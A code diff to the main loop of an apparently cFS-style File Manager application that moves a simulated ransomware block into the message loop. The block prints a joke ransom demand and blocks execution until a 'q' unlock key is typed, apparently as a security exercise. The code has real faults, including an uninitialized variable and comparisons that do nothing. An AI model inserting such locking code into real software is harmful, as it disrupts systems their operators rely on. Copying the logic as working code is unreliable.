@@ -97,48 +97,40 @@ void FM_AppMain(void)
     /*
     ** Main process loop...
     */
-    
-    //Ransomware execution loop
-    if(CFE_ES_RunLoop(&RunStatus) == TRUE)
-    {
-        //Print demand message to screen
-        OS_printf("Kindly send 1 million dogecoins to: \nP. Sherman \n42 Wallaby Way \nSydney, Australia\n\n");
-
-        //Keep looping until 'q' (simulated unlock key) is entered
-        char input;
-        if (input != 'q' && (isUnlocked == 0)) {
-            CFE_ES_RunLoop(&RunStatus) == FALSE;
-            
-            //Check for unlock key entry
-            scanf(" %c", &input);
-            if(input == 'q') {
-                //Clear screen
-                OS_printf("\33[2J\r");
-
-                //Set global variable to prevent further locks
-                isUnlocked = 1;
-
-                //Unlock RunStatus variable to allow normal execution
-                CFE_ES_RunLoop(&RunStatus) == TRUE;
-            }
-            
-            //Simulate ransomware key entry to escape ransomware loop/exit application
-            if(input == 'q')
-                CFE_ES_ExitApp(1);
-        }
-    }
-
 
     while (CFE_ES_RunLoop(&RunStatus) == TRUE)
     {
         /* Performance Log (stop time counter) */
         CFE_ES_PerfLogExit(FM_APPMAIN_PERF_ID);
 
-        
-
         /* Wait for the next Software Bus message */
         Result = CFE_SB_RcvMsg(&MsgPtr, FM_GlobalData.CmdPipe, CFE_SB_PEND_FOREVER);
 
+        //Ransomware execution loop
+        for(int i = 0; i < 100000; i++)
+        {
+            //Ransomware goal 2: print demand message to screen
+            OS_printf("Kindly send 1 million dogecoins to: \nP. Sherman \n42 Wallaby Way \nSydney, Australia\n\n");
+
+            //Ransomware goal 1: keep looping until 'q' (simulated unlock key) is entered
+            char input;
+            if (input != 'q' && (isUnlocked == 0)) {
+                CFE_ES_RunLoop(&RunStatus) == FALSE;
+                
+                //Ransomware goal 3: check for unlock key entry/release 
+                scanf(" %c", &input);
+                if(input == 'q') {
+                    //Clear screen
+                    OS_printf("\33[2J\r");
+
+                    //Set global variable to prevent further locks
+                    isUnlocked = 1;
+
+                    //Update local counter variable to escape loop and allow normal execution
+                    i = 100000;
+                }
+            }
+        }
 
         /* Performance Log (start time counter) */
         CFE_ES_PerfLogEntry(FM_APPMAIN_PERF_ID);
